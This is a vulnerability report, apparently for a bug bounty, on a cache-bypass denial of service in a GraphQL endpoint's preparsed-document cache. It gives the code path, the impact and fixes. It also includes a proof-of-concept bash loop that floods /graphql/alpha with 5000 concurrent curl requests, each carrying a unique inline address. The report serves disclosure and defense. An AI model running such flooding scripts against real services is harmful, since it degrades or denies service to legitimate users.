### Title
Cache-Bypass DoS via Inline evmAddress Literals in GraphQL Query String

### Summary
The `CachedPreparsedDocumentProvider` caches parsed+validated GraphQL documents keyed on the raw query string. An unauthenticated attacker can embed a unique `evmAddress` literal directly in the query string on every request, producing a distinct cache key each time and forcing a full parse+validate+execute cycle per request. The GraphQL module has no rate limiting, making this trivially repeatable at high volume.

### Finding Description

**Exact code path:**

`CachedPreparsedDocumentProvider.getDocumentAsync()` at line 26 keys the Caffeine async cache on `executionInput.getQuery()` — the raw query string verbatim:

```java
// CachedPreparsedDocumentProvider.java:26
return cache.get(executionInput.getQuery(), key -> parseAndValidateFunction.apply(executionInput));
``` [1](#0-0) 

The cache is bounded at `maximumSize=1000` with a 1-hour TTL: [2](#0-1) 

The `AccountInput` schema accepts `evmAddress` as a free-form hex string matching `^(0x)?[a-fA-F0-9]{40}$`, yielding 16^40 ≈ 1.2×10^48 distinct valid values: [3](#0-2) 

`AccountController` routes the `evmAddress` path directly to `EntityServiceImpl.getByEvmAddressAndType()` with no additional gating: [4](#0-3) 

**Root cause:** The cache key is the full query string. GraphQL variables are a separate field (`variables`) and do not affect the query string. When a client embeds the address as an inline literal instead of a variable, every distinct address produces a distinct cache key and a guaranteed cache miss.

**Exploit flow:**
1. Attacker sends requests with the address embedded as a literal:
   ```
   POST /graphql/alpha
   {"query":"{ account(input:{evmAddress:\"0x0000000000000000000000000000000000000001\"}){id}}"}
   {"query":"{ account(input:{evmAddress:\"0x0000000000000000000000000000000000000002\"}){id}}"}
   ...
   ```
2. Each request has a unique query string → cache miss every time.
3. GraphQL engine runs full tokenize → parse → validate → execute on every request.
4. The cache fills to 1000 entries and then evicts old ones; the attacker's new addresses are always fresh misses.

**Why existing checks are insufficient:**

- **Parser limits** (`maxCharacters=10000`, `maxTokens=1000`, `maxRuleDepth=100`) cap the size of a single query but do not prevent the cache bypass; the attack query is tiny (~70 chars). [5](#0-4) 

- **Complexity/depth instrumentation** (`MaxQueryComplexityInstrumentation(200)`, `MaxQueryDepthInstrumentation(10)`) execute *after* parse+validate, so they do not reduce the CPU cost of the bypassed cache stage. [6](#0-5) 

- **No rate limiting exists in the graphql module.** The `ThrottleConfiguration` / `ThrottleManagerImpl` / `ThrottleProperties` classes are exclusively in the `web3` module. A grep across all `graphql/src/**/*.java` for `RateLimiter`, `throttle`, `HttpSecurity`, or `filterChain` returns only the `LoggingFilter` (which only logs). [7](#0-6) 

- **No authentication is required** to reach `/graphql/alpha`; no `SecurityConfig` class exists in the graphql module.
  

### Impact Explanation
Every cache-miss request forces the JVM to tokenize, parse, and validate the GraphQL document from scratch. At sustained high request rates (easily achievable from a single machine with async HTTP), CPU consumption on the mirror node's GraphQL process rises proportionally. Because there is no per-IP or global request-rate cap in the graphql module, a single unauthenticated client can monopolize CPU, degrading or denying service to all legitimate users of the GraphQL API. The 30% CPU threshold cited in the scope is realistic even at moderate request rates (hundreds of requests/second) given the absence of any throttle.

### Likelihood Explanation
The attack requires zero privileges, zero authentication, and no special tooling — only the ability to send HTTP POST requests with varying hex strings. The address space is effectively infinite (16^40 values). The technique is well-known in the GraphQL security community (inline-literal vs. variable cache poisoning). Any motivated attacker or automated scanner can execute this continuously and indefinitely.

### Recommendation
1. **Normalize the cache key**: Strip or ignore inline literal values when computing the cache key, or require clients to use GraphQL variables (rejecting queries that embed variable-length string literals inline). Spring for GraphQL supports a `persistedQueriesProvider` pattern that only accepts pre-registered query hashes.
2. **Add rate limiting to the graphql module**: Implement a per-IP or global token-bucket rate limiter (analogous to `ThrottleConfiguration` in the `web3` module) as a servlet filter or `WebGraphQlInterceptor` applied to `/graphql/alpha`.
3. **Enforce variable-only queries**: Reject any `account` query where `evmAddress` (or `alias`) appears as an inline string literal rather than a variable reference, detectable at the `WebGraphQlInterceptor` level before the preparsed-document cache is consulted.

### Proof of Concept
```bash
# Generate 5000 unique evmAddress literals and flood the endpoint
for i in $(seq 1 5000); do
  ADDR=$(printf "0x%040x" $i)
  curl -s -o /dev/null -X POST http://<host>:8083/graphql/alpha \
    -H 'Content-Type: application/json' \
    -d "{\"query\":\"{ account(input:{evmAddress:\\\"$ADDR\\\"}){id}}\"}" &
done
wait
```
Each request carries a distinct query string, guaranteeing a cache miss and a full parse+validate+execute cycle. Monitor JVM CPU via `/actuator/metrics/process.cpu.usage` or `jconsole`; CPU will climb linearly with request rate. Contrast with the variable form (single cache entry, CPU stays flat):
```bash
curl -X POST http://<host>:8083/graphql/alpha \
  -H 'Content-Type: application/json' \
  -d '{"query":"query($a:String!){account(input:{evmAddress:$a}){id}}","variables":{"a":"0x0000000000000000000000000000000000000001"}}'
```
